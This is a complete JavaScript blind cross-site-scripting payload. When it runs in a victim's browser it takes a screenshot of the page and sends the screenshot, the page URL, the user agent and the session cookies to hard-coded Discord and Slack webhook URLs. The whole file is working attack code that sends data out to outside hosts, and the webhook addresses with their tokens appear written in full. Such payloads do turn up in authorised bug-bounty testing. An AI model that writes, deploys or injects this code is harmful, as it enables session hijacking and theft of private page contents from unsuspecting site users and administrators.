(async function() {
    // --- CONFIGURATION ---
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEI8DKf6DFSMJ6srVpn9_aErB37o';
    const slackWebhookUrl = 'https://hooks.slack.com/services/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';

    // --- HELPER FUNCTIONS ---
    // Function to load a script dynamically and wait for it to be ready
    const loadScript = (src) => {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    };

    // Converts a data URL to a Blob object
    function dataURLtoBlob(dataurl) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }

    // --- MAIN LOGIC ---
    try {
        // 1. Wait for the html2canvas library to load
        await loadScript('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js');

        // 2. Wait for the screenshot to be taken
        const canvas = await html2canvas(document.body);
        const screenshotDataUrl = canvas.toDataURL('image/jpeg', 0.7);
        const screenshotBlob = dataURLtoBlob(screenshotDataUrl);

        // --- 3. Send to Discord ---
        const discordFormData = new FormData();
        const discordEmbed = {
            title: "Blind XSS Fired with Screenshot!",
            description: `**Vulnerable URL:**\n\`\`\`${document.location.href}\`\`\``,
            color: 5814783,
            fields: [
                { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
                { name: "Cookies", value: `\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }
            ],
            image: { url: "attachment://screenshot.jpg" }
        };
        discordFormData.append('payload_json', JSON.stringify({ embeds: [discordEmbed] }));
        discordFormData.append('file', screenshotBlob, 'screenshot.jpg');
        
        const discordResponse = await fetch(discordWebhookUrl, { method: 'POST', body: discordFormData });
        if (!discordResponse.ok) {
            console.error('Discord Webhook Error:', await discordResponse.text());
        }

        // --- 4. Send to Slack ---
        // Note: Slack webhooks can't upload files directly. We send the screenshot as a data URL.
        const slackPayload = {
            text: "Blind XSS Fired!",
            blocks: [
                { "type": "header", "text": { "type": "plain_text", "text": "Blind XSS Fired!" } },
                { "type": "section", "fields": [
                    { "type": "mrkdwn", "text": `*Vulnerable URL:*\n${document.location.href}` },
                    { "type": "mrkdwn", "text": `*User Agent:*\n${navigator.userAgent}` }
                ]},
                { "type": "section", "text": { "type": "mrkdwn", "text": `*Cookies:*\n\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }},
                { "type": "image", "image_url": screenshotDataUrl, "alt_text": "Screenshot of the page" }
            ]
        };

        const slackResponse = await fetch(slackWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(slackPayload)
        });
        if (!slackResponse.ok) {
            console.error('Slack Webhook Error:', await slackResponse.text());
        }

    } catch (error) {
        // If anything fails, log the error to the browser console for debugging
        console.error('XSS Payload Execution Error:', error);
    }
})();
